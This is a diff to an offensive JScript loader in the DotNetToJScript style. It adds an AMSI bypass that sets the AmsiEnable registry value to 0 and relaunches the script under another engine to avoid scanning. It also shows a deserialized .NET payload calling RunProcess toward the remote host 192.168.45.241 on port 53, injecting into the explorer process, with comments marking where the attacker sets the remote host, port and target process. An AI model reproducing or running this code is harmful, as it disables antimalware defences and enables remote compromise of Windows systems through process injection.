@@ -1,6 +1,23 @@
 function setversion() {
-new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+	new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
 }
+// 4MS7_BYP455
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+
+try{
+	var AmsiEnable = sh.RegRead(key);
+	if(AmsiEnable!=0){
+	throw new Error(1, '');
+	}
+}catch(e){
+	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
+	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
+	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
+	WScript.Quit(1);
+}
+
+// ADD alert() CALL HERE IF DESIRE DEBUGGING
 function debug(s) {}
 function base64ToStream(b) {
 	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
@@ -191,7 +208,9 @@ try {
 	var d = fmt.Deserialize_2(stm);
 	al.Add(undefined);
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
-	o.RunProcess("192.168.45.241", "53", "svchost");
+	// USER CONFIG HERE
+    // RHOST, RPORT, INJECT_PROC
+	o.RunProcess("192.168.45.241", "53", "explorer");
 } catch (e) {
     debug(e.message);
 }
